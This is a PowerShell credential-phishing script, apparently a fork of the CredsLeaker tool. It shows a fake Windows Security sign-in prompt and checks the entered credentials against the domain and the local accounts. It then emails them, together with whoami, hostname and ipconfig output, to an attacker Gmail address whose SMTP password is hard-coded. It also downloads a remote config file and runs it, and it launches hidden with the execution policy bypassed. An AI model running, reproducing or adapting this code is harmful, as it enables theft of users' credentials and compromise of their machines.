<# .SYNOPSIS Credentials Leaker v4 Main Author: Dviros 
Feature Edits from v3 to v4: apsec 
Required Dependencies: None 
Optional Dependencies: None 

.DESCRIPTION Credsleaker allows an attacker to craft a highly convincing credentials prompt using Windows Security, validate it against the DC and Local SAM and in turn leak it via an HTTP request or export to USB. It also has dynamic export and timer features to allow for different attack scenerios. 

.PARAMETER Caption Message box title. 

.PARAMETER Message Message box message. 

.PARAMETER Server External web server IP or FQDN. 

.PARAMETER Port Web Server's Port - SSL Breaks Usage 

.PARAMETER Delivery Leaked Credentials delivery method. Valid entries: usb/http 

.PARAMETER Filename The path and filename of csv file if using USB Delivery. Entry Syntax: "\PATH\FILENAME.CSV" . Note: the leading \ is necessary. 

.PARAMETER usblabel Label of usb drive. 

.PARAMETER mode dynamic, static, config. Dynamic - If USB Drive/Path are valid, script defaults here, else it uses HTTP POST. Static - Uses default param or Pipeline Delivery method. If Delivery Method is USB but given usblabel is not found, it waits in the background until it is, then writes credentials to CSV. Config - Defines all Params from a given config file. 

.PARAMETER timer Timer is how many minutes the script waits after loading itself to memory before presenting the Credentials PopUp. This is designed to be used primarily in a HID type attack. 

.PARAMETER override Override simply overrides local/remote config files with pipeline or default parameters. Valid entry: override 

.EXAMPLE Powershell.exe -ExecutionPolicy bypass -Windowstyle hidden -noninteractive -nologo -file "CredsLeaker.ps1" -Caption "Sign in" -Message "Enter your credentials" -Server "malicious.com" -Port "8080" 

.LINK https://github.com/Dviros/CredsLeaker 
https://docs.microsoft.com/en-us/uwp/api/windows.security.credentials.ui.authenticationprotocol 
https://www.bleepingcomputer.com/news/security/psa-beware-of-windows-powershell-credential-request-prompts/ 

#>

param (
    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$Caption = 'Sign in',

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$Message = 'Enter your credentials',

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$Server = "YOUR_URL/cl_reader.php?",

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$Port = "80",

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$delivery = "http",

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$filename = "\cl_loot\creds.csv",

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$usblabel = "YOURUSB",

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$mode = "dynamic",

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$timer = $null,

    [Parameter(Mandatory = $false, ValueFromPipeline = $true)]
    [string]$override = $null
)

# Find and Load config file. Default to local if available but switches to web config if local not found. Can manually set Local or Web
#by setting mode and delivery options respectiviley

if ([string]::IsNullOrEmpty($override)) {
    $temp = $env:TEMP
    $volumes = get-volume | where-Object { $_.DriveType -contains "Removable" } | select DriveLetter
    foreach ($drive in $volumes.driveletter) {
        if (test-path -path $drive":\config.cl") {
            Copy-Item -Path $drive":\config.cl" -Destination $temp"cl_params.ps1"
            $path = $drive
        }
    }
}

if ([string]::IsNullOrEmpty($path)) {
    Invoke-RestMethod -uri "https://apsec.dev/scripts/credtrojan/config.cl" -OutFile $temp"\cl_params.ps1"
}
# If being used, load config file
if (Test-Path -Path $temp"cl_params.ps1") {
    . $temp"\cl_params.ps1"
}
# Set Mode - Static, Dynamic, or Config File

switch ($mode) {
    static { $method = $delivery }
    config { <# I do not think this will be configured here #> }
    dynamic {
        if ($path) {
            if (test-path -Path $path) { $method = "usb" }
            else { $method = "http" }
        }
        else { $method = "http" }
    }

}

# Time delay before deployment?

if ($timer) {
    $timer = ($timer -as [int])*60
    Start-Sleep -s $timer
}
# Add Assemblies and Initiate Count Down
Add-Type -AssemblyName System.Runtime.WindowsRuntime
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
[Windows.Security.Credentials.UI.CredentialPicker, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerResults, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
[Windows.Security.Credentials.UI.AuthenticationProtocol, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerOptions, Windows.Security.Credentials.UI, ContentType = WindowsRuntime]
#[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

[String]$CurrentDomain_Name = $env:USERDOMAIN
[String]$ComputerName = $env:COMPUTERNAME

# For our While loop
$status = $true


# There are 6 different authentication protocols supported.
$options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
$options.AuthenticationProtocol = 0
$options.Caption = $Caption
$options.Message = $Message
$options.TargetName = "1"


# CredentialPicker is using Async so we will need to use Await
function Await($WinRtTask, $ResultType) {
    $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
    $netTask = $asTask.Invoke($null, @($WinRtTask))
    $netTask.Wait(-1) | Out-Null
    $netTask.Result
}


function Credentials() {
    while ($status) {

        # Where the magic happens
        $creds = Await ([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])
        if ([string]::isnullorempty($creds.CredentialPassword)) {
            Credentials
        }
        if ([string]::isnullorempty($creds.CredentialUserName)) {
            Credentials
        }
        else {
            [String]$Username = $creds.CredentialUserName;
            [String]$Password = $creds.CredentialPassword;
            $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    	    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
	    $authlocal = $DS.ValidateCredentials($Username, $Password)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$Username,$Password)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){

            	# SEND SECOND EMAIL IF USER ENTER VALID SYSTEM CREDENTIALS
		$local_creds= "Username: " + $Username+ " Password: " + $Password+ " Domain:" + $CurrentDomain_Name
	    	$System_Subject = "SYSTEM CREDENTIALS HIJACKED (VALID CREDS) !!!!"
		$newline = "`r`n"
		$SmtpServer = 'smtp.gmail.com'
		$SmtpUser = 'firmusphising@gmail.com'
                $smtpPassword = 'Firmus@123'
                $MailtTo = 'firmusphising@gmail.com'
                $MailFrom = 'firmusphising@gmail.com'
                $Content  = $output
                $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) 
		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
                $status = $false
                exit

                }
                else {
		    # SEND EMAIL IF USER ENTER INVALID SYSTEM CREDENTIALS, CAN BE USED FOR PASSWORD SPRAYING
		    $local_creds= "Username: " + $Username+ " Password: " + $Password+ " Domain:" + $CurrentDomain_Name
	    	    $System_Subject = "SYSTEM CREDENTIALS HIJACKED (INVALID CREDS) !!!!"
		    $newline = "`r`n"
	            $SmtpServer = 'smtp.gmail.com'
		    $SmtpUser = 'firmusphising@gmail.com'
                    $smtpPassword = 'Firmus@123'
                    $MailtTo = 'firmusphising@gmail.com'
                    $MailFrom = 'firmusphising@gmail.com'
                    $Content  = $output
                    $Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) 
		    Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
                
                    Credentials
                }
            }
          }
}
    

$SmtpServer = 'smtp.gmail.com'
$SmtpUser = 'firmusphising@gmail.com'
$smtpPassword = 'Firmus@123'
$MailtTo = 'firmusphising@gmail.com'
$MailFrom = 'firmusphising@gmail.com'
$MailSubject = "BAD USB LINK CLICKED!!!!"
$Content  = $output
$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) 




# SEND FIRST EMAIL FOR SYSTEM INFO

$username_command = whoami
$hostname_command = hostname
$ipaddr_command = ipconfig

$username_output = "Username : "
$hostname_output = "Hostname : "
$ip_output = "IP : "
$newline = "`r`n"

$sysinfo = $username_output+$username_command+$newline+$hostname_output+$hostname_command+$newline+$ip_output+$ipaddr_command+$newline
Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $MailSubject -Body $sysinfo -SmtpServer $SmtpServer -UseSsl -Credential $credentials

Credentials
